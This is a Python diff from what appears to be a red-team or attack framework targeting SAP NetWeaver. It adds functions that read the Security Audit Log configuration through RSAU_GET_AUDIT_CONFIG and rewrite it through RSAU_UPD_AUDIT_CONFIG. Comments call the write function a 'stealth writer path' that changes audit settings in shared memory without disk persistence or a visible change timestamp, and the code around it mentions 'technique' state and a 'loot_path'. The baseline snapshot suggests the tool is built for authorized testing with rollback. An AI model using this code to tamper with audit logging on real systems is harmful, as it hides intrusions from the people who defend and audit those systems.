@@ -86,6 +86,8 @@ _STATIC_PARAMS = frozenset((
     "rsau/ip_only", "rec/client", "stat/level",
 ))
 
+_LEGACY_BYTE_FIELDS = ("MSGVECT", "SELVAR")
+
 
 @dataclass
 class SalSlotInfo:
@@ -310,6 +312,78 @@ def _rows_retag_profname(rows, profile_name: str) -> list:
     return out
 
 
+# ---------------------------------------------------------------------------
+# Legacy SAL config — RSAU_GET/UPD_AUDIT_CONFIG (shared-memory only)
+# ---------------------------------------------------------------------------
+
+def read_legacy_sal_config(conn) -> dict:
+    """Read the kernel's in-memory SAL config via ``RSAU_GET_AUDIT_CONFIG``.
+
+    Returns positional ``RSAUINFO`` rows (row 0 = slot 1, row 1 = slot 2).
+    No ``PROFNAME`` / ``SLOTNO`` keys — rows are identified by position.
+
+    Result::
+
+        {"ok": bool, "enable": str, "slotcount": int,
+         "slotinfo": [rows], "error": str}
+    """
+    try:
+        r = conn.call("RSAU_GET_AUDIT_CONFIG")
+    except Exception as e:
+        msg = str(e)
+        if "FUNCTION_NOT_FOUND" in msg or "FU_NOT_FOUND" in msg:
+            return {"ok": False, "enable": "", "slotcount": 0,
+                    "slotinfo": [], "error": "RSAU_GET_AUDIT_CONFIG not found"}
+        if "NO_AUTHORITY" in msg:
+            return {"ok": False, "enable": "", "slotcount": 0,
+                    "slotinfo": [],
+                    "error": f"NO_AUTHORITY: {msg[:200]}"}
+        return {"ok": False, "enable": "", "slotcount": 0,
+                "slotinfo": [], "error": f"RFC error: {msg[:200]}"}
+    enable = str(r.get("ENABLE", "") or "").strip()
+    slotcount = int(r.get("SLOTCOUNT", 0) or 0)
+    slotinfo = list(r.get("SLOTINFO", []) or [])
+    return {"ok": True, "enable": enable, "slotcount": slotcount,
+            "slotinfo": slotinfo, "error": ""}
+
+
+def write_legacy_sal_config(conn, slotinfo, enable="-") -> dict:
+    """Write to the kernel's in-memory SAL config via ``RSAU_UPD_AUDIT_CONFIG``.
+
+    Shared-memory only — no disk persistence, no profile-name header
+    update, no "Last changed by" timestamp shift in SM19.
+
+    Args:
+        slotinfo: list of ``RSAUINFO`` dicts (positional, same order as
+            returned by ``read_legacy_sal_config``).
+        enable: ``'-'`` = don't change global audit enable flag;
+                ``'X'`` = enable; ``' '`` = disable.
+
+    Returns ``{"ok": bool, "error": str, "e_excp_text": str}``.
+    """
+    try:
+        r = conn.call("RSAU_UPD_AUDIT_CONFIG",
+                       ENABLE=enable,
+                       SLOTINFO=_rows_to_rfc(slotinfo,
+                                             byte_fields=_LEGACY_BYTE_FIELDS))
+    except Exception as e:
+        msg = str(e)
+        exc_label = ""
+        if "NO_AUTHORITY" in msg:
+            exc_label = "NO_AUTHORITY"
+        elif "SHM_ACCESS_ERROR" in msg:
+            exc_label = "SHM_ACCESS_ERROR"
+        return {"ok": False,
+                "error": f"{exc_label or 'RFC error'}: {msg[:200]}",
+                "e_excp_text": ""}
+    e_text = str(r.get("E_EXCP_TEXT", "") or "").strip()
+    if e_text:
+        return {"ok": False,
+                "error": f"E_EXCP_TEXT: {e_text}",
+                "e_excp_text": e_text}
+    return {"ok": True, "error": "", "e_excp_text": ""}
+
+
 @dataclass
 class BaselineSnapshot:
     """Captured state of a target node prior to Tier 3 mutation.
@@ -343,6 +417,11 @@ class BaselineSnapshot:
     dyn_filt: list = field(default_factory=list)
     dyn_filtex: list = field(default_factory=list)
     dyn_text: list = field(default_factory=list)
+    # Legacy RSAUINFO rows from RSAU_GET_AUDIT_CONFIG — positional
+    # (row 0 = slot 1).  Used by the stealth writer path
+    # (RSAU_UPD_AUDIT_CONFIG) which mutates shared memory only,
+    # without touching the static profile on disk.
+    legacy_slotinfo: list = field(default_factory=list)
     # Free-form bag for technique-specific snapshot data
     # (e.g. NWA log-config XML before flip).  Keyed by technique id.
     technique_state: dict = field(default_factory=dict)
@@ -360,6 +439,7 @@ class BaselineSnapshot:
             "dyn_filt": _rows_to_jsonable(self.dyn_filt),
             "dyn_filtex": _rows_to_jsonable(self.dyn_filtex),
             "dyn_text": _rows_to_jsonable(self.dyn_text),
+            "legacy_slotinfo": _rows_to_jsonable(self.legacy_slotinfo),
             "technique_state": dict(self.technique_state),
             "loot_path": self.loot_path,
         }
@@ -377,6 +457,7 @@ class BaselineSnapshot:
             dyn_filt=list(d.get("dyn_filt") or []),
             dyn_filtex=list(d.get("dyn_filtex") or []),
             dyn_text=list(d.get("dyn_text") or []),
+            legacy_slotinfo=list(d.get("legacy_slotinfo") or []),
             technique_state=dict(d.get("technique_state") or {}),
             loot_path=d.get("loot_path", ""),
         )
@@ -497,6 +578,17 @@ def capture_baseline(node, creds=None,
             except Exception as e:
                 logger.warning(f"{snap.sid}: RSAU_API_GET_PROFILE "
                                 f"failed: {format_rfc_exception(e)}")
+
+            # Legacy RSAUINFO rows via RSAU_GET_AUDIT_CONFIG — the
+            # stealth writer path (RSAU_UPD_AUDIT_CONFIG) needs these
+            # positional rows for read-modify-write.
+            try:
+                legacy = read_legacy_sal_config(conn)
+                if legacy["ok"]:
+                    snap.legacy_slotinfo = legacy["slotinfo"]
+            except Exception as e:
+                logger.warning(f"{snap.sid}: legacy SAL config read "
+                                f"raised: {format_rfc_exception(e)}")
 
             # Legacy RSAUPROF fallback — only if the modern API wasn't
             # available (older NetWeaver kernels).  Modern S/4 returns
